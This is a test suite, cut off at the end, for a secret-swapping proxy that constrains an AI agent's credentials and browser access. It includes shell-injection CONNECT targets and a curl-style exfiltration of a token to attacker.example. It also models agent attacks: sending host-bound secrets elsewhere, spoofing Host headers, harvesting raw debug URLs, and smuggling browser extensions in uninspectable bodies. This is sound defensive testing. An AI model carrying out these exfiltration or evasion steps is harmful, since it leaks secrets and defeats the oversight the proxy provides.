import { describe, it, expect, beforeAll, afterEach, vi } from 'vitest';
import fs from 'node:fs';
import http from 'node:http';
import https from 'node:https';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import tls from 'node:tls';
import { gzipSync } from 'node:zlib';
import { X509Certificate } from 'node:crypto';
import type { AddressInfo } from 'node:net';
import { TokenStore } from './token-store.js';
import { CertAuthority } from './ca.js';
import { CdpSessionStore } from './cdp-session-store.js';
import { createCoatcheck, type Coatcheck, type CoatcheckDeps } from './server.js';
import { createMemoryProvider } from './memory-provider.js';
import { parsePolicy } from './policy.js';
import { parseHostPattern, type HostPattern } from './host-matcher.js';

const hosts = (...entries: string[]) => entries.map(e => parseHostPattern(e) as HostPattern);

/** Capture console output (to assert on log lines and that values never appear). */
function captureLogs() {
  const lines: string[] = [];
  const spies = (['log', 'warn', 'error'] as const).map(m =>
    vi.spyOn(console, m).mockImplementation((...args: unknown[]) => { lines.push(args.map(String).join(' ')); }));
  cleanups.push(() => spies.forEach(sp => sp.mockRestore()));
  return lines;
}

/** Plain-HTTP request through the proxy (absolute-form URL). */
function viaProxy(proxyPort: number, url: string, headers: http.OutgoingHttpHeaders = {}) {
  return new Promise<{ status: number; headers: http.IncomingHttpHeaders; body: string }>((resolve, reject) => {
    const req = http.request({ host: '127.0.0.1', port: proxyPort, method: 'GET', path: url, headers }, res => {
      let body = '';
      res.on('data', d => { body += d; });
      res.on('end', () => resolve({ status: res.statusCode ?? 0, headers: res.headers, body }));
    });
    req.on('error', reject);
    req.end();
  });
}

/** Plain-HTTP listener on loopback that records what it receives (an agent-run "attacker" or a real upstream). */
async function startHttpUpstream() {
  const received: Echo[] = [];
  const server = http.createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on('data', (d: Buffer) => chunks.push(d));
    req.on('end', () => {
      received.push({ url: req.url ?? '', headers: req.headers, body: Buffer.concat(chunks).toString() });
      res.end('ok');
    });
  });
  await new Promise<void>(r => server.listen(0, '127.0.0.1', r));
  cleanups.push(() => new Promise<void>(r => { server.closeAllConnections(); server.close(() => r()); }));
  return { port: (server.address() as AddressInfo).port, received };
}

interface Echo { url: string; headers: http.IncomingHttpHeaders; body?: string }

let proxyCa: CertAuthority;
let upstreamCa: CertAuthority;
const cleanups: Array<() => Promise<void> | void> = [];

beforeAll(async () => {
  proxyCa = await CertAuthority.create({ subject: 'CN=proxy test CA' });
  upstreamCa = await CertAuthority.create({ subject: 'CN=upstream test CA' });
});

afterEach(async () => {
  for (const fn of cleanups.splice(0).reverse()) await fn();
});

async function startProxy(overrides: Partial<CoatcheckDeps> = {}) {
  const tokenStore = new TokenStore();
  const cdpSessionStore = new CdpSessionStore();
  const coatcheck: Coatcheck = createCoatcheck({
    tokenStore,
    provider: createMemoryProvider(),
    ca: proxyCa,
    cdpSessionStore,
    upstreamCa: upstreamCa.caCertPem,
    ...overrides,
  });
  const { port } = await coatcheck.listen(0, '127.0.0.1');
  cleanups.push(() => { tokenStore.destroy(); cdpSessionStore.destroy(); }, () => coatcheck.close());
  return { tokenStore, cdpSessionStore, port };
}

/** HTTPS upstream on 127.0.0.1 with a cert from `upstreamCa`. Echoes the request, or serves `body`. */
async function startHttpsUpstream(body?: string) {
  const leaf = await upstreamCa.getCertForHost('127.0.0.1');
  const received: Echo[] = [];
  let tlsConnections = 0;
  const server = https.createServer({ key: leaf.key, cert: leaf.cert }, (req, res) => {
    const chunks: Buffer[] = [];
    req.on('data', (d: Buffer) => chunks.push(d));
    req.on('end', () => {
      const reqBody = Buffer.concat(chunks).toString();
      received.push({ url: req.url ?? '', headers: req.headers, body: reqBody });
      res.setHeader('content-type', 'application/json');
      res.end(body ?? JSON.stringify({ url: req.url, headers: req.headers, body: reqBody }));
    });
  });
  server.on('secureConnection', () => { tlsConnections++; });
  await new Promise<void>(r => server.listen(0, '127.0.0.1', r));
  cleanups.push(() => new Promise<void>(r => { server.closeAllConnections(); server.close(() => r()); }));
  return { port: (server.address() as AddressInfo).port, received, connections: () => tlsConnections };
}

/** Send CONNECT to the proxy; resolve with the status line and the raw socket. */
function connect(proxyPort: number, target: string): Promise<{ status: string; socket: net.Socket }> {
  return new Promise((resolve, reject) => {
    const socket = net.connect(proxyPort, '127.0.0.1', () => {
      socket.write(`CONNECT ${target} HTTP/1.1\r\nHost: ${target}\r\n\r\n`);
    });
    cleanups.push(() => { socket.destroy(); });
    socket.once('data', d => resolve({ status: d.toString().split('\r\n')[0], socket }));
    socket.once('error', reject);
  });
}

function startTls(socket: net.Socket, ca: string): Promise<tls.TLSSocket> {
  return new Promise((resolve, reject) => {
    const t = tls.connect({ socket, ca, host: '127.0.0.1' }, () => resolve(t));
    t.once('error', reject);
  });
}

/** Read `n` Content-Length-framed HTTP responses from a stream. */
function readResponses(stream: NodeJS.ReadableStream, n: number): Promise<Array<{ head: string; body: string }>> {
  return new Promise((resolve, reject) => {
    let buf = Buffer.alloc(0);
    const out: Array<{ head: string; body: string }> = [];
    const onData = (chunk: Buffer) => {
      buf = Buffer.concat([buf, chunk]);
      for (;;) {
        const end = buf.indexOf('\r\n\r\n');
        if (end === -1) return;
        const head = buf.subarray(0, end).toString();
        const len = parseInt(/content-length:\s*(\d+)/i.exec(head)?.[1] ?? '0', 10);
        if (buf.length < end + 4 + len) return;
        out.push({ head, body: buf.subarray(end + 4, end + 4 + len).toString() });
        buf = buf.subarray(end + 4 + len);
        if (out.length === n) {
          stream.off('data', onData);
          resolve(out);
          return;
        }
      }
    };
    stream.on('data', onData);
    stream.once('error', reject);
    stream.once('end', () => { if (out.length < n) reject(new Error(`stream ended after ${out.length} responses`)); });
  });
}

const issuerCn = (sock: tls.TLSSocket) => new X509Certificate(sock.getPeerX509Certificate()!.raw).issuer;

describe('coatcheck server: CONNECT', () => {
  it('rejects CONNECT targets carrying shell metacharacters with 400 and runs nothing', async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'coatcheck-attack-'));
    cleanups.push(() => fs.rmSync(dir, { recursive: true, force: true }));
    const marker = path.join(dir, 'pwned');
    const { tokenStore, port } = await startProxy();
    tokenStore.issue('k', 'v'); // non-empty store: the old code path would have reached openssl

    for (const target of [`$(touch ${marker}).com:443`, `\`touch ${marker}\`.com:443`, '../../tmp/x:443']) {
      const { status } = await connect(port, target);
      expect(status, target).toBe('HTTP/1.1 400 Bad Request');
    }
    expect(fs.existsSync(marker)).toBe(false);
  });

  it('tunnels without MITM when no tickets are live', async () => {
    const upstream = await startHttpsUpstream();
    const { port } = await startProxy();

    const { status, socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    expect(status).toBe('HTTP/1.1 200 Connection Established');
    const t = await startTls(socket, upstreamCa.caCertPem); // trusts only the upstream CA
    expect(issuerCn(t)).toContain('CN=upstream test CA');

    t.write('GET /x HTTP/1.1\r\nHost: 127.0.0.1\r\nAuthorization: Bearer cct_literal\r\n\r\n');
    const [res] = await readResponses(t, 1);
    expect((JSON.parse(res.body) as Echo).headers.authorization).toBe('Bearer cct_literal');
  });

  it('MITMs when tickets are live and swaps tickets on every keep-alive request', async () => {
    const upstream = await startHttpsUpstream();
    const { tokenStore, port } = await startProxy();
    const t1 = tokenStore.issue('api-key', 'real-api-key').id;
    const t2 = tokenStore.issue('other', 'real-other').id;

    const { status, socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    expect(status).toBe('HTTP/1.1 200 Connection Established');
    const t = await startTls(socket, proxyCa.caCertPem); // trusts only coatcheck's CA
    expect(issuerCn(t)).toContain('CN=proxy test CA');

    const responses = readResponses(t, 2);
    t.write(`GET /a?key=${t1} HTTP/1.1\r\nHost: 127.0.0.1\r\nAuthorization: Bearer ${t1}\r\n\r\n`);
    t.write(`POST /b HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Api-Key: ${t2}\r\nContent-Length: 5\r\n\r\nhello`);
    const [r1, r2] = await responses;

    const e1 = JSON.parse(r1.body) as Echo;
    expect(e1.url).toBe('/a?key=real-api-key');
    expect(e1.headers.authorization).toBe('Bearer real-api-key');
    expect((JSON.parse(r2.body) as Echo).headers['x-api-key']).toBe('real-other');
    expect(upstream.received).toHaveLength(2);
    expect(upstream.connections()).toBe(1);
  });

  it('does not deliver a swapped request to an upstream whose certificate is untrusted', async () => {
    const upstream = await startHttpsUpstream();
    const { tokenStore, port } = await startProxy({ upstreamCa: undefined }); // Node root store only
    const tok = tokenStore.issue('api-key', 'real-api-key').id;
    const errors = vi.spyOn(console, 'error').mockImplementation(() => {});
    cleanups.push(() => errors.mockRestore());

    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    t.write(`GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nAuthorization: Bearer ${tok}\r\n\r\n`);
    await new Promise(r => t.once('close', r));
    expect(upstream.received).toHaveLength(0);
  });

  it('rewrites the browser connectUrl to the local CDP proxy when CDP is enabled', async () => {
    const upstream = await startHttpsUpstream(JSON.stringify({ id: 's1', connectUrl: 'wss://connect.example.test/s1?signingKey=secret' }));
    const { tokenStore, cdpSessionStore, port } = await startProxy({
      cdp: { port: 8444, advertiseHost: '127.0.0.1' },
      browserbaseApiHost: '127.0.0.1',
    });
    const tok = tokenStore.issue('browser-api-key', 'real-key').id;

    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    t.write(`POST /v1/sessions HTTP/1.1\r\nHost: 127.0.0.1\r\nX-BB-API-Key: ${tok}\r\nContent-Length: 0\r\n\r\n`);
    const [res] = await readResponses(t, 1);

    const body = JSON.parse(res.body) as { id: string; connectUrl: string };
    expect(body.id).toBe('s1');
    const m = /^ws:\/\/127\.0\.0\.1:8444\/cdp\/([a-f0-9]+)$/.exec(body.connectUrl);
    expect(m).not.toBeNull();
    expect(cdpSessionStore.get(m![1])).toBe('wss://connect.example.test/s1?signingKey=secret');
    expect(res.body).not.toContain('signingKey');
  });

  // Attack (roadmap item 13): with a valid API-key ticket the agent calls the
  // debug endpoint and receives raw CDP URLs, bypassing the CDP proxy's
  // substitution and redaction. Every route to the browser must be rewritten
  // or removed.
  it('rewrites or removes every raw CDP route in a debug-endpoint response', async () => {
    const debug = {
      debuggerFullscreenUrl: 'https://www.browserbase.com/devtools-fullscreen/inspector.html?wss=connect.browserbase.com/debug/s1/devtools/page/P1',
      debuggerUrl: 'https://www.browserbase.com/devtools/inspector.html?wss=connect.browserbase.com/debug/s1/devtools/page/P1',
      wsUrl: 'wss://connect.browserbase.com/debug/s1/devtools/browser/B1',
      pages: [{
        id: 'P1', url: 'https://example.com/login', faviconUrl: 'https://example.com/favicon.ico', title: 'Login',
        debuggerUrl: 'wss://connect.usw2.browserbase.com/debug/s1/devtools/page/P1',
        debuggerFullscreenUrl: 'https://www.browserbase.com/devtools-fullscreen/inspector.html?wss=connect.browserbase.com/debug/s1/devtools/page/P1',
      }],
    };
    const upstream = await startHttpsUpstream(JSON.stringify(debug));
    const { tokenStore, cdpSessionStore, port } = await startProxy({
      cdp: { port: 8444, advertiseHost: '127.0.0.1' },
      browserbaseApiHost: '127.0.0.1',
    });
    const tok = tokenStore.issue('browser-api-key', 'real-key').id;

    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    t.write(`GET /v1/sessions/s1/debug HTTP/1.1\r\nHost: 127.0.0.1\r\nX-BB-API-Key: ${tok}\r\n\r\n`);
    const [res] = await readResponses(t, 1);

    expect(res.body).not.toContain('browserbase.com');
    const body = JSON.parse(res.body) as { wsUrl: string; pages: Array<Record<string, string>> };
    const local = /^ws:\/\/127\.0\.0\.1:8444\/cdp\/([a-f0-9]+)$/;
    expect(cdpSessionStore.get(local.exec(body.wsUrl)![1])).toBe(debug.wsUrl);
    expect(cdpSessionStore.get(local.exec(body.pages[0].debuggerUrl)![1])).toBe(debug.pages[0].debuggerUrl);
    expect(cdpSessionStore.adapterName(local.exec(body.wsUrl)![1])).toBe('browserbase');
    expect(body).not.toHaveProperty('debuggerUrl');
    expect(body).not.toHaveProperty('debuggerFullscreenUrl');
    expect(body.pages[0]).not.toHaveProperty('debuggerFullscreenUrl');
    expect(body.pages[0]).toMatchObject({ id: 'P1', url: 'https://example.com/login', title: 'Login' });
  });

  it('strips signingKey and seleniumRemoteUrl from a session-create response', async () => {
    const upstream = await startHttpsUpstream(JSON.stringify({
      id: 's1', connectUrl: 'wss://connect.browserbase.com?signingKey=SK', seleniumRemoteUrl: 'http://connect.browserbase.com/webdriver', signingKey: 'SK',
    }));
    const { port } = await startProxy({ cdp: { port: 8444, advertiseHost: '127.0.0.1' }, browserbaseApiHost: '127.0.0.1' });
    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    t.write('POST /v1/sessions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n');
    const [res] = await readResponses(t, 1);
    expect(res.body).not.toContain('SK');
    expect(res.body).not.toContain('webdriver');
    const parsed = JSON.parse(res.body);
    expect(parsed).not.toHaveProperty('signingKey');
    expect(parsed).not.toHaveProperty('seleniumRemoteUrl');
  });

  // Attack (roadmap item 20): the agent passes a browser extension on
  // session-create to run its own code in the browser. The adapter strips the
  // extension params from the request body before it reaches Browserbase.
  it('strips extensionId from a session-create request body when CDP is enabled', async () => {
    const upstream = await startHttpsUpstream(JSON.stringify({ id: 's1' }));
    const { port } = await startProxy({ cdp: { port: 8444, advertiseHost: '127.0.0.1' }, browserbaseApiHost: '127.0.0.1' });
    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    const reqBody = JSON.stringify({ projectId: 'p', extensionId: 'ext-1', browserSettings: { extensionId: 'ext-2', viewport: { width: 1280, height: 720 } } });
    t.write(`POST /v1/sessions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: ${Buffer.byteLength(reqBody)}\r\n\r\n${reqBody}`);
    await readResponses(t, 1);

    const forwarded = JSON.parse(upstream.received[0].body ?? '') as Record<string, unknown>;
    expect(forwarded).not.toHaveProperty('extensionId');
    expect(forwarded.browserSettings).not.toHaveProperty('extensionId');
    // Non-extension fields are preserved, and the forwarded Content-Length matches.
    expect(forwarded).toMatchObject({ projectId: 'p', browserSettings: { viewport: { width: 1280, height: 720 } } });
    expect(Number(upstream.received[0].headers['content-length'] ?? '0')).toBe(Buffer.byteLength(JSON.stringify(forwarded)));
  });

  // Attack (issue #13): the extension params ride in a body shape the adapter
  // can't read — JSON under another content type, content-encoded, padded past
  // the cap, or malformed. Each is refused; nothing reaches the browser service.
  describe('refuses adapter-host request bodies it cannot inspect', () => {
    const ext = JSON.stringify({ projectId: 'p', extensionId: 'ext-1' });
    const frame = (headers: string, body: Buffer | string) => Buffer.concat([
      Buffer.from(`POST /v1/sessions HTTP/1.1\r\nHost: 127.0.0.1\r\n${headers}Content-Length: ${Buffer.byteLength(body)}\r\n\r\n`),
      Buffer.isBuffer(body) ? body : Buffer.from(body),
    ]);
    const cdp = { cdp: { port: 8444, advertiseHost: '127.0.0.1' }, browserbaseApiHost: '127.0.0.1' };

    // A JSON config under another (or no) content type is still JSON: it is
    // inspected and stripped rather than streamed on the strength of the label.
    it.each([
      ['text/plain', 'Content-Type: text/plain\r\n'],
      ['no Content-Type', ''],
    ])('inspects and strips a JSON body declared as %s', async (_name, header) => {
      const upstream = await startHttpsUpstream(JSON.stringify({ id: 's1' }));
      const { port } = await startProxy(cdp);
      const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
      const t = await startTls(socket, proxyCa.caCertPem);
      t.write(frame(header, ext));
      const [res] = await readResponses(t, 1);
      expect(res.head).toMatch(/^HTTP\/1\.1 200 /);
      expect(JSON.parse(upstream.received[0].body ?? '')).toEqual({ projectId: 'p' });
    });

    it.each<[string, Buffer]>([
      ['gzip-encoded JSON', frame('Content-Type: application/json\r\nContent-Encoding: gzip\r\n', gzipSync(ext))],
      ['malformed JSON', frame('Content-Type: application/json\r\n', "{projectId: 'p', extensionId: 'ext-1'}")],
      ['JSON padded past COATCHECK_MAX_SWAP_BODY_BYTES', frame('Content-Type: application/json\r\n', JSON.stringify({ pad: 'x'.repeat(2000), extensionId: 'ext-1' }))],
      // Declared past the cap: refused from the head, before any body arrives.
      ['Content-Length past COATCHECK_MAX_SWAP_BODY_BYTES', Buffer.from('POST /v1/sessions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 5000000\r\n\r\n')],
      // The multipart exemption keys on Content-Type; a repeated field lets an
      // upstream that honours the last one read the body as JSON.
      ['JSON behind a repeated Content-Type (multipart first)', frame('Content-Type: multipart/form-data; boundary=b\r\nContent-Type: application/json\r\n', ext)],
    ])('%s is refused with 403 uninspectable-body and never forwarded', async (_name, request) => {
      const upstream = await startHttpsUpstream(JSON.stringify({ id: 's1' }));
      const { port } = await startProxy({ ...cdp, maxSwapBodyBytes: 1024 });
      const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
      const t = await startTls(socket, proxyCa.caCertPem);
      const closed = new Promise<void>(r => t.once('close', () => r()));
      t.write(request);
      const [res] = await readResponses(t, 1);
      expect(res.head).toMatch(/^HTTP\/1\.1 403 /);
      expect(res.head).toMatch(/X-Coatcheck-Denied: uninspectable-body/i);
      expect(JSON.parse(res.body)).toMatchObject({ reason: 'uninspectable-body', host: '127.0.0.1' });
      await closed;
      expect(upstream.received).toEqual([]);
    });

    it('forwards an empty chunked body: nothing to inspect', async () => {
      const upstream = await startHttpsUpstream(JSON.stringify({ ok: true }));
      const { port } = await startProxy(cdp);
      const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
      const t = await startTls(socket, proxyCa.caCertPem);
      t.write('POST /v1/sessions/s1/stop HTTP/1.1\r\nHost: 127.0.0.1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n');
      const [res] = await readResponses(t, 1);
      expect(res.head).toMatch(/^HTTP\/1\.1 200 /);
      expect(upstream.received[0].url).toBe('/v1/sessions/s1/stop');
      expect(upstream.received[0].body).toBe('');
    });

    it('inspects a JSON body sent with Content-Encoding: identity', async () => {
      const upstream = await startHttpsUpstream(JSON.stringify({ id: 's1' }));
      const { port } = await startProxy(cdp);
      const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
      const t = await startTls(socket, proxyCa.caCertPem);
      t.write(frame('Content-Type: application/json\r\nContent-Encoding: identity\r\n', ext));
      const [res] = await readResponses(t, 1);
      expect(res.head).toMatch(/^HTTP\/1\.1 200 /);
      expect(JSON.parse(upstream.received[0].body ?? '')).toEqual({ projectId: 'p' });
    });

    it('forwards a multipart upload unchanged: no JSON config to inspect', async () => {
      const upstream = await startHttpsUpstream(JSON.stringify({ ok: true }));
      const { port } = await startProxy(cdp);
      const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
      const t = await startTls(socket, proxyCa.caCertPem);
      const body = '--b\r\nContent-Disposition: form-data; name="file"; filename="a.txt"\r\nContent-Type: text/plain\r\n\r\n{"extensionId":"ext-1"}\r\n--b--\r\n';
      t.write(frame('Content-Type: multipart/form-data; boundary=b\r\n', body));
      const [res] = await readResponses(t, 1);
      expect(res.head).toMatch(/^HTTP\/1\.1 200 /);
      expect(upstream.received[0].body).toBe(body);
      expect(upstream.received[0].headers['content-type']).toBe('multipart/form-data; boundary=b');
    });

    it('still streams a non-JSON body to the same host when CDP is disabled', async () => {
      const upstream = await startHttpsUpstream();
      const { tokenStore, port } = await startProxy({ browserbaseApiHost: '127.0.0.1' });
      tokenStore.issue('k', 'v');
      const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
      const t = await startTls(socket, proxyCa.caCertPem);
      t.write(frame('Content-Type: text/plain\r\n', ext));
      const [res] = await readResponses(t, 1);
      expect(res.head).toMatch(/^HTTP\/1\.1 200 /);
      expect(upstream.received[0].body).toBe(ext);
    });
  });

  it('uses custom adapters from the library API, matched by wildcard host', async () => {
    const upstream = await startHttpsUpstream(JSON.stringify({ browser: { cdp: 'wss://cdp.vendor.test/x' }, other: 'wss://cdp.vendor.test/y' }));
    const { cdpSessionStore, port } = await startProxy({
      cdp: { port: 8444, advertiseHost: '127.0.0.1' },
      browserAdapters: [{
        name: 'vendor',
        hosts: ['127.0.0.1'],
        rewriteJson(body, register) {
          const b = body as { browser: { cdp: string } };
          b.browser.cdp = register(b.browser.cdp);
          return true;
        },
      }],
    });
    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    t.write('GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n');
    const [res] = await readResponses(t, 1);
    const body = JSON.parse(res.body) as { browser: { cdp: string }; other: string };
    const sid = /\/cdp\/([a-f0-9]+)$/.exec(body.browser.cdp)![1];
    expect(cdpSessionStore.get(sid)).toBe('wss://cdp.vendor.test/x');
    expect(cdpSessionStore.adapterName(sid)).toBe('vendor');
    expect(body.other).toBe('wss://cdp.vendor.test/y');
  });

  it('refuses to start with an invalid adapter host pattern', async () => {
    await expect(startProxy({ cdp: { port: 8444, advertiseHost: '127.0.0.1' }, browserAdapters: [{ name: 'bad', hosts: ['*'], rewriteJson: () => false }] }))
      .rejects.toThrow(/browser adapter 'bad' host '\*'/);
  });

  it('leaves the connectUrl alone when CDP is disabled', async () => {
    const real = JSON.stringify({ connectUrl: 'wss://connect.example.test/s1' });
    const upstream = await startHttpsUpstream(real);
    const { tokenStore, port } = await startProxy({ browserbaseApiHost: '127.0.0.1' });
    tokenStore.issue('k', 'v');

    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    t.write('GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n');
    const [res] = await readResponses(t, 1);
    expect(res.body).toBe(real);
  });
});

describe('coatcheck server: host-bound tickets', () => {
  // The THREAT_MODEL exfiltration: mint a ticket for a secret bound to
  // api.github.com, then send it somewhere else through the proxy.
  const policy = parsePolicy(JSON.stringify({
    secrets: { 'github-token': { allowed_hosts: ['api.github.com'] } },
  }), []);
  const provider = () => createMemoryProvider({ secrets: { 'github-token': 'ghp_REAL_VALUE' } });

  async function mint(proxyPort: number): Promise<string> {
    const res = await fetch(`http://127.0.0.1:${proxyPort}/_vault/github-token`);
    const body = await res.json() as { token: string; allowed_hosts: string[] };
    expect(body.allowed_hosts).toEqual(['api.github.com']);
    return body.token;
  }

  it('blocks the attacker.example exfiltration on the plain-HTTP forward path', async () => {
    const logs = captureLogs();
    const { port } = await startProxy({ provider: provider(), policy });
    const tok = await mint(port);

    // curl -x proxy "http://attacker.example/?k=$TOK": denied before any DNS lookup or dial.
    const res = await viaProxy(port, `http://attacker.example/?k=${tok}`);
    expect(res.status).toBe(403);
    expect(res.headers['x-coatcheck-denied']).toBe('host-mismatch');
    expect(JSON.parse(res.body)).toMatchObject({ reason: 'host-mismatch', secrets: ['github-token'], host: 'attacker.example' });
    expect(res.body).not.toContain('ghp_REAL_VALUE');
    expect(logs).toContainEqual(expect.stringContaining('[swap] scheme=http host=attacker.example result=denied secrets=github-token'));
    expect(logs.join('\n')).not.toContain('ghp_REAL_VALUE');
  });

  it('blocks the loopback-listener variant: an agent-run listener never receives the value', async () => {
    captureLogs();
    const listener = await startHttpUpstream();
    // Even listing the loopback address (HTTPS-only entry) does not allow plaintext to it.
    const loopbackPolicy = parsePolicy(JSON.stringify({
      secrets: { 'github-token': { allowed_hosts: ['api.github.com', '127.0.0.1'] } },
    }), []);
    for (const p of [policy, loopbackPolicy]) {
      const { port } = await startProxy({ provider: provider(), policy: p });
      const { token } = await (await fetch(`http://127.0.0.1:${port}/_vault/github-token`)).json() as { token: string };
      for (const url of [`http://127.0.0.1:${listener.port}/?k=${token}`, `http://localhost:${listener.port}/`]) {
        const res = await viaProxy(port, url, { authorization: `Bearer ${token}` });
        expect(res.status, url).toBe(403);
      }
    }
    expect(listener.received).toHaveLength(0);
  });

  it('blocks the exfiltration over HTTPS: keyed on the CONNECT target, not Host', async () => {
    const logs = captureLogs();
    const upstream = await startHttpsUpstream(); // stands in for attacker.example
    // `always`: the tunnel is MITM'd, so the swap itself is what refuses.
    const { port } = await startProxy({ provider: provider(), policy, mitm: 'always' });
    const tok = await mint(port);

    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    // A spoofed Host header naming the allowed host does not help.
    t.write(`GET /?k=${tok} HTTP/1.1\r\nHost: api.github.com\r\nAuthorization: Bearer ${tok}\r\n\r\n`);
    const [res] = await readResponses(t, 1);

    expect(res.head).toMatch(/^HTTP\/1\.1 403 /);
    expect(res.head).toMatch(/\r\nX-Coatcheck-Denied: host-mismatch\r\n/i);
    expect(JSON.parse(res.body)).toMatchObject({ secrets: ['github-token'], host: '127.0.0.1' });
    await new Promise(r => t.once('close', r)); // the tunnel is closed
    expect(upstream.received).toHaveLength(0);
    expect(logs).toContainEqual(expect.stringContaining('[swap] scheme=https host=127.0.0.1 result=denied secrets=github-token'));
    expect(logs.join('\n')).not.toContain('ghp_REAL_VALUE');
  });

  it('under the default bound mode, sends the HTTPS exfiltration down a raw tunnel: only the literal ticket leaves', async () => {
    const logs = captureLogs();
    const upstream = await startHttpsUpstream();
    const { port } = await startProxy({ provider: provider(), policy });
    const tok = await mint(port);

    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, upstreamCa.caCertPem); // not intercepted: the upstream's own cert
    expect(issuerCn(t)).toContain('CN=upstream test CA');
    t.write(`GET / HTTP/1.1\r\nHost: api.github.com\r\nAuthorization: Bearer ${tok}\r\n\r\n`);
    await readResponses(t, 1);
    expect(upstream.received[0].headers.authorization).toBe(`Bearer ${tok}`);
    expect(logs).toContainEqual(expect.stringContaining('mode=passthrough reason=not-bound'));
  });

  it('denies a keep-alive tunnel on the first request carrying a mis-bound ticket', async () => {
    captureLogs();
    const upstream = await startHttpsUpstream();
    const { tokenStore, port } = await startProxy();
    const good = tokenStore.issue('local', 'real-local', { allowedHosts: hosts('127.0.0.1') }).id;
    const bad = tokenStore.issue('github-token', 'ghp_REAL_VALUE', { allowedHosts: hosts('api.github.com') }).id;

    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    t.write(`GET /a HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Key: ${good}\r\n\r\n`);
    const [r1] = await readResponses(t, 1);
    expect((JSON.parse(r1.body) as Echo).headers['x-key']).toBe('real-local');

    t.write(`GET /b HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Key: ${good}\r\nX-Other: ${bad}\r\n\r\n`);
    const [r2] = await readResponses(t, 1);
    expect(r2.head).toMatch(/^HTTP\/1\.1 403 /);
    expect(upstream.received.map(e => e.url)).toEqual(['/a']);
  });

  it('swaps bound tickets for their allowed host on both paths', async () => {
    captureLogs();
    const https = await startHttpsUpstream();
    const plain = await startHttpUpstream();
    const { tokenStore, port } = await startProxy();
    const tlsTok = tokenStore.issue('k', 'real-https', { allowedHosts: hosts('127.0.0.1') }).id;
    const httpTok = tokenStore.issue('k', 'real-http', { allowedHosts: hosts('http://127.0.0.1') }).id;

    const { socket } = await connect(port, `127.0.0.1:${https.port}`);
    const t = await startTls(socket, proxyCa.caCertPem);
    t.write(`GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nAuthorization: Bearer ${tlsTok}\r\n\r\n`);
    const [res] = await readResponses(t, 1);
    expect((JSON.parse(res.body) as Echo).headers.authorization).toBe('Bearer real-https');

    expect((await viaProxy(port, `http://127.0.0.1:${plain.port}/p?k=${httpTok}`)).status).toBe(200);
    expect(plain.received[0].url).toBe('/p?k=real-http');
    // The HTTPS-only ticket is refused over plaintext.
    expect((await viaProxy(port, `http://127.0.0.1:${plain.port}/p?k=${tlsTok}`)).status).toBe(403);
  });
});

/**
 * Raw TLS upstream on 127.0.0.1 (byte-level control for upgrade tests). Answers
 * `Upgrade: websocket` with 101 then echoes bytes; any other Upgrade with 426;
 * plain requests with 200 whose body is the request head.
 */
async function startRawTlsUpstream() {
  const leaf = await upstreamCa.getCertForHost('127.0.0.1');
  const heads: string[] = [];
  const server = tls.createServer({ key: leaf.key, cert: leaf.cert }, sock => {
    let buf = Buffer.alloc(0);
    let echo = false;
    sock.on('error', () => {});
    sock.on('data', d => {
      if (echo) { sock.write(d); return; }
      buf = Buffer.concat([buf, d]);
      for (;;) {
        const end = buf.indexOf('\r\n\r\n');
        if (end === -1) return;
        const head = buf.subarray(0, end).toString();
        buf = buf.subarray(end + 4);
        heads.push(head);
        if (/^upgrade: websocket/im.test(head)) {
          sock.write('HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n');
          echo = true;
          if (buf.length > 0) sock.write(buf);
          return;
        }
        if (/^upgrade:/im.test(head)) sock.write('HTTP/1.1 426 Upgrade Required\r\nContent-Length: 2\r\n\r\nno');
        else sock.write(`HTTP/1.1 200 OK\r\nContent-Length: ${Buffer.byteLength(head)}\r\n\r\n${head}`);
      }
    });
  });
  await new Promise<void>(r => server.listen(0, '127.0.0.1', r));
  cleanups.push(() => new Promise<void>(r => server.close(() => r())));
  return { port: (server.address() as AddressInfo).port, heads };
}

describe('coatcheck server: MITM policy', () => {
  /** Issuer of the certificate the client sees on a CONNECT to the upstream: proxy CA = MITM'd. */
  async function issuerSeen(proxyPort: number, upstreamPort: number): Promise<'proxy' | 'upstream'> {
    const { status, socket } = await connect(proxyPort, `127.0.0.1:${upstreamPort}`);
    expect(status).toBe('HTTP/1.1 200 Connection Established');
